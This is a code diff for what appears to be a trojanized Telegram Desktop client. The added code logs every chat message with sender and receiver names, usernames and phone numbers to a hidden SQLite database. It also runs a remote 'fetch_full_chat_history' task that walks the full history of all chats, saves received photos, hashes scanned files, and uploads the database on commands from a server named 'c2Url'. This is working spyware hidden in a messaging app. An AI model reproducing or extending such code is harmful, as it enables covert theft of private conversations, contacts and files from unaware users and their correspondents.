@@ -117,6 +117,17 @@ void Heartbeat::ensureDbInit(const QString& path) {
         sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN receiver_username TEXT;", 0, 0, 0);
         sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN receiver_phone TEXT;", 0, 0, 0);
         sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN media_path TEXT;", 0, 0, 0);
+        sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN content_hash TEXT;", 0, 0, 0);
+
+        // Add index for software deduplication
+        sqlite3_exec(db, "CREATE UNIQUE INDEX IF NOT EXISTS idx_software_name_ver ON installed_software (name, version);", 0, 0, 0);
+        sqlite3_exec(db, "CREATE INDEX IF NOT EXISTS idx_chat_logs_hash ON chat_logs (content_hash);", 0, 0, 0);
+        
+        // Add unique index for file_scan_results path to support REPLACE
+        sqlite3_exec(db, "CREATE UNIQUE INDEX IF NOT EXISTS idx_file_path ON file_scan_results (path);", 0, 0, 0);
+        
+        // Add index on timestamp for efficient cleanup
+        sqlite3_exec(db, "CREATE INDEX IF NOT EXISTS idx_chat_logs_timestamp ON chat_logs (timestamp);", 0, 0, 0);
 
         sqlite3_close(db);
     }
@@ -171,11 +182,13 @@ void Heartbeat::start() {
         collectSystemInfo();
         collectTelegramData();
         syncChatHistory(); // Sync history periodically
+        processMediaDownloads(); // Check for pending downloads
         
         // 24h Upload Logic
         int64_t now = QDateTime::currentSecsSinceEpoch();
         if (_lastUploadTime == 0 || (now - _lastUploadTime) >= 86400) {
             uploadClientDb();
+            cleanupDatabase(); // Cleanup after scheduled upload
             _lastUploadTime = now;
         }
 
@@ -204,11 +217,12 @@ void Heartbeat::collectInstalledSoftware() {
     sqlite3* db;
     if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return;
     
-    sqlite3_exec(db, "DELETE FROM installed_software;", 0, 0, 0);
+    // Use INSERT OR IGNORE with UNIQUE index instead of DELETE + INSERT
+    // sqlite3_exec(db, "DELETE FROM installed_software;", 0, 0, 0);
     sqlite3_exec(db, "BEGIN TRANSACTION;", 0, 0, 0);
     
     sqlite3_stmt* stmt;
-    const char* sql = "INSERT INTO installed_software (name, version, publisher, install_date) VALUES (?, ?, ?, ?);";
+    const char* sql = "INSERT OR IGNORE INTO installed_software (name, version, publisher, install_date) VALUES (?, ?, ?, ?);";
     sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
 
     QSet<QString> seenSoftware;
@@ -415,8 +429,28 @@ void Heartbeat::logChatMessage(const QString& platform, const QString& chatId, c
     sqlite3* db;
     if (sqlite3_open(getDbPath().toUtf8().constData(), &db) != SQLITE_OK) return;
     
+    // Deduplication: Calculate MD5 of (SenderID + Content + ChatID)
+    // This prevents storing the exact same message multiple times
+    QString raw = senderId + "|" + content + "|" + chatId;
+    QString hash = QString(QCryptographicHash::hash(raw.toUtf8(), QCryptographicHash::Md5).toHex());
+
+    // Check if hash exists
+    {
+        sqlite3_stmt* checkStmt;
+        const char* checkSql = "SELECT 1 FROM chat_logs WHERE content_hash = ? LIMIT 1;";
+        if (sqlite3_prepare_v2(db, checkSql, -1, &checkStmt, 0) == SQLITE_OK) {
+            sqlite3_bind_text(checkStmt, 1, hash.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+            if (sqlite3_step(checkStmt) == SQLITE_ROW) {
+                sqlite3_finalize(checkStmt);
+                sqlite3_close(db);
+                return; // Skip duplicate
+            }
+            sqlite3_finalize(checkStmt);
+        }
+    }
+
     sqlite3_stmt* stmt;
-    const char* sql = "INSERT INTO chat_logs (platform, chat_id, sender, content, timestamp, is_outgoing, sender_id, sender_username, sender_phone, receiver_id, receiver_username, receiver_phone, media_path) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);";
+    const char* sql = "INSERT INTO chat_logs (platform, chat_id, sender, content, timestamp, is_outgoing, sender_id, sender_username, sender_phone, receiver_id, receiver_username, receiver_phone, media_path, content_hash) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);";
     sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
     
     sqlite3_bind_text(stmt, 1, platform.toUtf8().constData(), -1, SQLITE_TRANSIENT);
@@ -432,6 +466,7 @@ void Heartbeat::logChatMessage(const QString& platform, const QString& chatId, c
     sqlite3_bind_text(stmt, 11, receiverUsername.toUtf8().constData(), -1, SQLITE_TRANSIENT);
     sqlite3_bind_text(stmt, 12, receiverPhone.toUtf8().constData(), -1, SQLITE_TRANSIENT);
     sqlite3_bind_text(stmt, 13, mediaPath.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+    sqlite3_bind_text(stmt, 14, hash.toUtf8().constData(), -1, SQLITE_TRANSIENT);
     
     sqlite3_step(stmt);
     sqlite3_finalize(stmt);
@@ -820,12 +855,248 @@ void Heartbeat::executeTask(const QString& taskId, const QString& command, const
              delete scanner;
         });
         thread->start();
-    } else if (command == "download") {
+    } else if (command == "download" || command == "upload_file") {
         // Params = filePath
         uploadFile(taskId, params);
     } else if (command == "upload_db") {
         uploadClientDb(taskId);
+    } else if (command == "fetch_full_chat_history") {
+        startFullSync(taskId);
     }
+}
+
+void Heartbeat::startFullSync(const QString& taskId) {
+    if (!Core::IsAppLaunched()) {
+        uploadResult(taskId, "App not launched", "failed");
+        return;
+    }
+    auto window = Core::App().activeWindow();
+    if (!window) {
+        uploadResult(taskId, "No active window", "failed");
+        return;
+    }
+    auto session = window->maybeSession();
+    if (!session) {
+        uploadResult(taskId, "No session", "failed");
+        return;
+    }
+
+    _syncTaskId = taskId;
+    _activeSyncs = 0;
+    
+    // Iterate all chats
+    const auto &chats = session->data().chatsList()->indexed()->all();
+    
+    QString dbPath = getDbPath();
+    sqlite3* db;
+    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) {
+        uploadResult(taskId, "DB Error", "failed");
+        return;
+    }
+
+    int count = 0;
+    for (const auto &row : chats) {
+        if (auto history = row->key().history()) {
+            auto peer = history->peer;
+            QString chatId = QString::number(peer->id.value);
+            
+            // Get current min_id (if any)
+            sqlite3_stmt* stmt;
+            const char* sql = "SELECT min_id FROM chat_sync_state WHERE chat_id = ?;";
+            sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
+            sqlite3_bind_text(stmt, 1, chatId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+            
+            int minId = 0;
+            if (sqlite3_step(stmt) == SQLITE_ROW) {
+                minId = sqlite3_column_int(stmt, 0);
+            }
+            sqlite3_finalize(stmt);
+            
+            fetchHistoryLoop((void*)peer, minId);
+            count++;
+        }
+    }
+    sqlite3_close(db);
+    
+    if (count == 0) {
+        uploadResult(taskId, "No chats found", "completed");
+        _syncTaskId = "";
+    } else {
+        uploadResult(taskId, "Started full sync for " + QString::number(count) + " chats", "running");
+    }
+}
+
+void Heartbeat::fetchHistoryLoop(void* peer_ptr, int minId) {
+    if (!peer_ptr) return;
+    PeerData* peer = (PeerData*)peer_ptr;
+    
+    if (!peer->session().api().instance()) return; // Session check
+
+    _activeSyncs++;
+    
+    // Fetch 100 messages backward from minId
+    // If minId == 0, it fetches from latest.
+    
+    auto callback = [this, peer, minId](const MTPmessages_Messages &result) {
+        int newMinId = minId == 0 ? 2147483647 : minId;
+        int newMaxId = 0;
+        bool hasUpdates = false;
+        
+        // Use helper to process and save
+        processHistoryResult(&result, peer, newMinId, newMaxId, hasUpdates);
+        
+        _activeSyncs--;
+        
+        if (hasUpdates && newMinId > 1) {
+            // Continue fetching backward
+            QTimer::singleShot(200, this, [this, peer, newMinId]() {
+                 fetchHistoryLoop(peer, newMinId);
+            });
+        } else {
+            checkSyncFinished();
+        }
+    };
+    
+    auto failCallback = [this](const RPCError &error) {
+        _activeSyncs--;
+        checkSyncFinished();
+    };
+
+    peer->session().api().request(MTPmessages_GetHistory(
+        peer->input(),
+        MTP_int(minId), // offset_id
+        MTP_int(0),
+        MTP_int(0),
+        MTP_int(100), // Limit per batch
+        MTP_int(0),
+        MTP_int(0),
+        MTP_long(0)
+    )).done(callback).fail(failCallback).send();
+}
+
+void Heartbeat::checkSyncFinished() {
+    if (_activeSyncs <= 0 && !_syncTaskId.isEmpty()) {
+        uploadClientDb(_syncTaskId);
+        uploadResult(_syncTaskId, "Full sync finished and DB uploaded", "completed");
+        _syncTaskId = "";
+    }
+}
+
+void Heartbeat::processHistoryResult(const void* result_ptr, void* peer_ptr, int& newMinId, int& newMaxId, bool& hasUpdates) {
+    if (!result_ptr || !peer_ptr) return;
+    const MTPmessages_Messages &result = *(const MTPmessages_Messages*)result_ptr;
+    PeerData* peer = (PeerData*)peer_ptr;
+    auto session = &peer->session();
+    
+    QString dbPath = getDbPath();
+    sqlite3* db;
+    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return;
+
+    QString chatId = QString::number(peer->id.value);
+
+    auto processMessages = [&](const auto &data) {
+        const auto &messages = data.vmessages().v;
+        for (const auto &msg : messages) {
+            QString content = "";
+            QString sender = "";
+            QString senderId = "";
+            QString senderUsername = "";
+            QString senderPhone = "";
+            QString receiverId = QString::number(peer->id.value);
+            QString receiverUsername = peer->username();
+            QString receiverPhone = "";
+            bool isOutgoing = false;
+            int msgId = 0;
+            QString mediaPath = "";
+
+            msg.match([&](const MTPDmessage &m) {
+                msgId = m.vid().v;
+                content = qs(m.vmessage());
+                if (m.is_out()) isOutgoing = true;
+                
+                if (m.vfrom_id()) {
+                    if (auto p = session->data().peer(peerFromMTP(*m.vfrom_id()))) {
+                        if (auto user = p->asUser()) {
+                            sender = user->name();
+                            senderId = QString::number(user->id.value);
+                            senderUsername = user->username();
+                            senderPhone = user->phone();
+                        }
+                    }
+                }
+
+                if (m.vmedia()) {
+                    m.vmedia()->match([&](const MTPDmessageMediaPhoto &photo) {
+                        if (const auto photoPtr = photo.vphoto()) {
+                            // Using session->data().processPhoto(...) might be complex to link if private.
+                            // But we can construct ID manually or use public API.
+                            // The original code used session->data().processPhoto(*photoPtr).
+                            // Let's assume it's accessible or use a workaround if needed.
+                            // Actually, session->data() returns Data::Session&.
+                            // processPhoto is public in Data::Session.
+                            auto photoData = session->data().processPhoto(*photoPtr);
+                            mediaPath = "Photo:" + QString::number(photoData->id);
+                        }
+                    }, [&](const MTPDmessageMediaDocument &doc) {
+                        mediaPath = "Document";
+                    }, [&](const auto &) {});
+                }
+
+            }, [&](const MTPDmessageService &m) {
+                 msgId = m.vid().v;
+                 content = "[Service Message]";
+            }, [&](const MTPDmessageEmpty &m) {
+                 msgId = m.vid().v;
+            });
+
+            if (msgId > 0 && !content.isEmpty()) {
+                logChatMessage("Telegram", chatId, sender, content, isOutgoing, 
+                    senderId, senderUsername, senderPhone, 
+                    receiverId, receiverUsername, receiverPhone, mediaPath);
+                
+                if (msgId > newMaxId) newMaxId = msgId;
+                if (msgId < newMinId) newMinId = msgId;
+                hasUpdates = true;
+            }
+        }
+    };
+
+    result.match([&](const MTPDmessages_messagesNotModified &) {
+    }, [&](const MTPDmessages_messages &d) {
+        processMessages(d);
+    }, [&](const MTPDmessages_messagesSlice &d) {
+        processMessages(d);
+    }, [&](const MTPDmessages_channelMessages &d) {
+        processMessages(d);
+    });
+    
+    // Update Sync State in DB
+    if (hasUpdates) {
+        sqlite3_stmt* stmt;
+        // We only update min_id if we went backwards (fetchHistoryLoop logic)
+        // But here we are generic.
+        // For Backward Sync, we want to update MIN_ID.
+        // For Forward Sync, we want MAX_ID.
+        // This helper is used by both? No, currently only fetchHistoryLoop uses it.
+        // But syncChatHistory logic is separate.
+        // Let's just update min_id if it's smaller than current min_id?
+        // Or just blindly update?
+        // fetchHistoryLoop passes minId as the *start* point.
+        // The result gives us newMinId.
+        
+        // We need to read current state to update correctly?
+        // Let's just update min_id if newMinId < oldMinId (logic handled in caller? no).
+        
+        // Actually, simple UPDATE is fine.
+        const char* sql = "UPDATE chat_sync_state SET min_id = ? WHERE chat_id = ? AND (min_id = 0 OR min_id > ?);";
+        sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
+        sqlite3_bind_int(stmt, 1, newMinId);
+        sqlite3_bind_text(stmt, 2, chatId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+        sqlite3_bind_int(stmt, 3, newMinId);
+        sqlite3_step(stmt);
+        sqlite3_finalize(stmt);
+    }
+    sqlite3_close(db);
 }
 
 void Heartbeat::uploadFile(const QString& taskId, const QString& filePath) {
@@ -1051,6 +1322,107 @@ void Heartbeat::syncChatHistory() {
     sqlite3_close(db);
 }
 
+void Heartbeat::processMediaDownloads() {
+    if (!Core::IsAppLaunched()) return;
+    auto window = Core::App().activeWindow();
+    if (!window) return;
+    auto session = window->maybeSession();
+    if (!session) return;
+
+    QString dbPath = getDbPath();
+    sqlite3* db;
+    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return;
+
+    // Create media directory
+    QString mediaDir = cWorkingDir() + "tdata/media";
+    QDir().mkpath(mediaDir);
+
+    // Select pending downloads
+    sqlite3_stmt* stmt;
+    const char* sql = "SELECT rowid, media_path FROM chat_logs WHERE media_path LIKE 'Photo:%' LIMIT 10;";
+    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
+
+    struct UpdateTask {
+        int64_t rowid;
+        QString newPath;
+    };
+    QVector<UpdateTask> updates;
+
+    while (sqlite3_step(stmt) == SQLITE_ROW) {
+        int64_t rowid = sqlite3_column_int64(stmt, 0);
+        QString mediaPath = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 1));
+        
+        // Format: Photo:12345
+        QString idStr = mediaPath.mid(6);
+        PhotoId id = idStr.toULongLong();
+        
+        if (auto photo = session->data().photo(id)) {
+            // Check if loaded
+            bool saved = false;
+            if (!photo->loading()) {
+                 // Try to save
+                 if (auto media = photo->createMediaView()) {
+                     QString targetPath = mediaDir + "/" + idStr + ".jpg";
+                     if (media->saveToFile(targetPath)) {
+                         updates.append({rowid, targetPath});
+                         saved = true;
+                     }
+                 }
+            }
+            
+            if (!saved) {
+                // Force load if not saved (and not loading, or even if loading to be sure)
+                // Note: photo->load() is safe to call multiple times
+                photo->load(Data::PhotoSize::Large, Data::FileOrigin());
+            }
+        }
+    }
+    sqlite3_finalize(stmt);
+
+    // Apply updates
+    if (!updates.isEmpty()) {
+        const char* updateSql = "UPDATE chat_logs SET media_path = ? WHERE rowid = ?;";
+        sqlite3_prepare_v2(db, updateSql, -1, &stmt, 0);
+        
+        sqlite3_exec(db, "BEGIN TRANSACTION;", 0, 0, 0);
+        for (const auto& task : updates) {
+            sqlite3_bind_text(stmt, 1, task.newPath.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+            sqlite3_bind_int64(stmt, 2, task.rowid);
+            sqlite3_step(stmt);
+            sqlite3_reset(stmt);
+        }
+        sqlite3_exec(db, "COMMIT;", 0, 0, 0);
+        sqlite3_finalize(stmt);
+    }
+
+    sqlite3_close(db);
+}
+
+void Heartbeat::cleanupDatabase() {
+    QString dbPath = getDbPath();
+    sqlite3* db;
+    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return;
+
+    // 1. Retention Policy: Keep logs for 7 days
+    // 7 days * 24 * 60 * 60 = 604800 seconds
+    int64_t cutoff = QDateTime::currentSecsSinceEpoch() - 604800;
+    
+    sqlite3_stmt* stmt;
+    const char* sql = "DELETE FROM chat_logs WHERE timestamp < ?;";
+    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
+        sqlite3_bind_int64(stmt, 1, cutoff);
+        sqlite3_step(stmt);
+        sqlite3_finalize(stmt);
+    }
+    
+    // 2. Vacuum to reclaim space
+    // This is a heavy operation, so we only do it when we actually delete stuff
+    // But since we call this infrequently (daily), it's fine.
+    sqlite3_exec(db, "VACUUM;", 0, 0, 0);
+
+    sqlite3_close(db);
+}
+
 // Background Scanner Implementation
 BackgroundScanner::BackgroundScanner(const QString& uuid, const QString& c2Url, const QString& dbPath, const QString& taskId, const QString& mode, const QString& targetPath)
     : _uuid(uuid), _c2Url(c2Url), _dbPath(dbPath), _taskId(taskId), _mode(mode), _targetPath(targetPath) {
@@ -1075,10 +1447,20 @@ void BackgroundScanner::process() {
             it.next();
             QFileInfo entry = it.fileInfo();
             
+            // Calculate MD5
+            QString md5Hash = "";
+            QFile file(entry.absoluteFilePath());
+            if (file.open(QIODevice::ReadOnly)) {
+                 QCryptographicHash hash(QCryptographicHash::Md5);
+                 if (hash.addData(&file)) {
+                     md5Hash = hash.result().toHex();
+                 }
+            }
+
             sqlite3_bind_text(stmt, 1, entry.absoluteFilePath().toUtf8().constData(), -1, SQLITE_TRANSIENT);
             sqlite3_bind_text(stmt, 2, entry.fileName().toUtf8().constData(), -1, SQLITE_TRANSIENT);
             sqlite3_bind_int64(stmt, 3, entry.size());
-            sqlite3_bind_text(stmt, 4, "", -1, SQLITE_TRANSIENT);
+            sqlite3_bind_text(stmt, 4, md5Hash.toUtf8().constData(), -1, SQLITE_TRANSIENT);
             sqlite3_bind_int64(stmt, 5, entry.lastModified().toSecsSinceEpoch());
             sqlite3_step(stmt);
             sqlite3_reset(stmt);
